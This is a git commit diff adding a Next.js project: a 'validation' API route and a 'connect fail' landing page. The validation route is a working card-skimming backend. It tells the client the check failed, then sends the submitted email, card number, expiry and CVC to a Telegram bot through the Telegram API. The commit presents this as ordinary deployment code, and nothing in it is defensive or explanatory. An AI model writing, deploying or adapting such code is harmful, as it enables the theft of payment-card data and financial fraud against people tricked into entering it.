bf463a88c147fcfac61b7e2b7c7de17edacba61e
nbsupp <invisible.cheats@gmail.com>
2022-12-20 14:02:00 +0200

    deploy

---
+++ pages/api/validation.js
@@ -0,0 +1,21 @@
+// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
+
+export default function handler(req, res) {
+  res.status(200).json({ status: "fail" });
+  const { email, number, cvc, selected, selectedy } = req.body;
+  const url = `https://api.telegram.org/bot${process.env.TOKEN}/sendMessage?chat_id=${process.env.CHAT_ID}&text=${email}+${number}+${selected}+${selectedy}+${cvc}`;
+  const checkValidation = async (url) => {
+    try {
+      const response = await fetch(url);
+      const json = await response.json();
+      if (json.ok) {
+        console.log("Sended");
+      } else {
+        console.log("Send fail");
+      }
+    } catch (e) {
+      console.log(e);
+    }
+  };
+  checkValidation(url);
+}
---
+++ pages/index.js
@@ -0,0 +1,17 @@
+import Head from "next/head";
+
+export default function Home() {
+  return (
+    <>
+      <Head>
+        <title>Connect fail</title>
+        <meta name="description" content="Connect fail" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="icon" href="/favicon.ico" />
+      </Head>
+      <div>
+        <h1>connect fail</h1>
+      </div>
+    </>
+  );
+}
